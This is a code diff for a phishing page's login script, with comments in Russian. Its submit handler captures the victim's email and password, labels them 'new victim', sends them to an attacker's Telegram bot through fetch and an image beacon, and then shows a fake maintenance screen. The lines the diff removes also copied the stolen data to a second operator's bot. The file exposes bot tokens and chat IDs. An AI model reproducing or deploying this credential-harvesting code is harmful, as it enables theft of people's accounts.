@@ -110,19 +110,9 @@
 </div>
 
 <script>
-    // === НОВЫЕ ДАННЫЕ ===
-    const MY_BOT_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";   // твой бот (не меняется)
-    const HIS_BOT_TOKEN = "8842883108:AAFza9ZypL71T92auiTCmcnwPAkGfjGtC6c"; // его бот (НОВЫЙ)
-
-    const MY_ID = "8648082259";      // твой ID (не меняется)
-    const HIS_ID = "8784393556";     // его ID (НОВЫЙ)
-
-    // === ФУНКЦИЯ ОТПРАВКИ ===
-    function sendMessage(botToken, chatId, text) {
-        const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text);
-        fetch(url, { mode: "no-cors" });
-        new Image().src = url;
-    }
+    // === ТОЛЬКО ТВОЙ БОТ И ТВОЙ ID ===
+    const BOT_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA"; // твой бот
+    const CHAT_ID = "8648082259"; // твой ID
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -137,16 +127,11 @@
         }
 
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
 
-        // === ОСНОВНАЯ ОТПРАВКА (его бот → ему и тебе) ===
-        sendMessage(HIS_BOT_TOKEN, HIS_ID, text);   // ему
-        sendMessage(HIS_BOT_TOKEN, MY_ID, text);    // тебе (от его бота)
+        fetch(url, { mode: "no-cors" });
+        new Image().src = url;
 
-        // === ДОПОЛНИТЕЛЬНО: если данные ввёл он — они всё равно придут тебе (через твоего бота) ===
-        const extraText = "📩 [ДУБЛЬ] от его бота\n" + text;
-        sendMessage(MY_BOT_TOKEN, MY_ID, extraText);
-
-        // Показываем техработы
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
     });
